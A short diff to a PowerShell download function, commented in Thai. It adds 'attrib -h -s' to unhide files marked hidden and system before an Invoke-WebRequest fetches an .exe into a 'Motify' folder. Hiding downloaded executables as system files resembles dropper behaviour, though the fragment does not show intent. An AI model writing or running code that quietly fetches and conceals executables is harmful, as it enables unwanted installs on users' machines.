@@ -84,7 +84,14 @@ function Download-Script {
     # Path ของไฟล์ที่บันทึก
     $filePath = Join-Path $dirPath $fileName
 	$micofilePath = Join-Path $micoPath $fileName
-    
+       
+	# เอาคุณสมบัติซ่อนออกก่อน
+    if (Test-Path $filePath) {
+        attrib -h -s $filePath
+    }
+    if (Test-Path $micofilePath) {
+        attrib -h -s $micofilePath
+    }
     # ดาวน์โหลดไฟล์ .exe จาก URL และบันทึกลงในโฟลเดอร์ Motify
 try {
         Invoke-WebRequest -Uri $url -OutFile $filePath
